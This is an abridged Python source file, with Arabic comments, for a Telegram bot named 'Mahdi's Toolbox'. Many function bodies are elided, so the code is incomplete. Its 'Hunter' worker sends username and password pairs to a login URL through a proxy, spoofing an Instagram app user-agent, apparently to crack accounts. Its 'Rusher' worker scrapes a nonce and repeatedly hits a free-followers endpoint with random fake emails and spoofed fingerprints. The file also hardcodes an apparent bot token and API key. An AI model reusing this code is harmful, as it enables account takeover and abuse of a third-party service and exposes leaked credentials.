# ==============================================================================
#  MAHDI'S TOOLBOX - v5.1 (Strategic Patience Edition)
# ==============================================================================
import os
import requests
import random
import time
import threading
import json
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from bs4 import BeautifulSoup
import re

# --- إعدادات أساسية ---
TOKEN = "1936058114:AAHm19u1R6lv_vShGio-MIo4Z0rjVUoew_U"
CHAT_ID = "1148797883"
SCRAPER_API_KEY = "da54f75953fed511420acb3003111fa0"

# ... (باقي الكود يبقى كما هو تماماً) ...

# --- دوال أداة فحص الحسابات (Hunter) ---
def hunter_worker():
    # ... (هذا الجزء يبقى كما هو) ...
    while is_running:
        # ...
        try:
            # ...
            payload = {
                'api_key': SCRAPER_API_KEY,
                'url': target_url,
                'method': 'POST',
                'body': f'username={username}&password={password}&queryParams=%7B%7D&optIntoOneTap=false',
                'headers': {
                    'User-Agent': 'Instagram 113.0.0.39.122 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G935F; hero2lte; samsungexynos8890; en_US)',
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
            }
            # التعديل هنا أيضاً لزيادة المهلة
            response = requests.post('http://api.scraperapi.com', json=payload, timeout=90)
            # ...
        except Exception as e:
            # ...
        time.sleep(2)

# --- دوال أдаة رشق المتابعين (Rusher) - The Double Agent ---
def create_double_agent_fingerprint():
    # ... (هذا الجزء يبقى كما هو) ...

def rusher_worker(target_username):
    global hits, fails, last_event
    while is_running:
        try:
            agent_session = requests.Session()
            agent_session.headers.update(create_double_agent_fingerprint())

            last_event = f"Scouting {target_username}..."
            page_url = "https://superviral.io/free-instagram-followers/"
            
            # *** التعديل الأول هنا ***
            response_page = agent_session.get(f'http://api.scraperapi.com?api_key={SCRAPER_API_KEY}&url={page_url}', timeout=90)
            
            if response_page.status_code != 200:
                fails += 1; last_event = "Scouting failed."; time.sleep(5); continue

            soup = BeautifulSoup(response_page.content, 'html.parser')
            nonce_input = soup.find('input', {'name': '_wpnonce'})
            
            if not nonce_input or not nonce_input.get('value'):
                fails += 1; last_event = "Could not find nonce ticket."; time.sleep(5); continue
            
            nonce_ticket = nonce_input.get('value')
            last_event = "Nonce ticket acquired. Attacking..."

            random_email = f"user{random.randint(10000, 99999)}@example.com"
            api_url = "https://superviral.io/wp-admin/admin-ajax.php"
            
            payload = {
                'action': 'get_free_followers',
                'username': target_username,
                'email': random_email,
                '_wpnonce': nonce_ticket
            }
            
            # *** التعديل الثاني هنا ***
            response_rush = agent_session.post(f'http://api.scraperapi.com?api_key={SCRAPER_API_KEY}&url={api_url}', data=payload, timeout=90)

            if response_rush.status_code == 200 and '"success":true' in response_rush.text.lower():
                hits += 1
                last_event = f"🚀 Followers sent to {target_username}!"
            else:
                fails += 1
                error_msg = response_rush.json().get('data', 'Unknown error') if response_rush.headers.get('Content-Type') == 'application/json' else 'Unknown error'
                last_event = f"Rush failed: {error_msg}"

            time.sleep(60)

        except Exception as e:
            fails += 1
            last_event = f"Rusher Error: {e}"
            time.sleep(10)

# ... (باقي الكود يبقى كما هو تماماً) ...

if __name__ == "__main__":
    # ... (هذا الجزء يبقى كما هو) ...
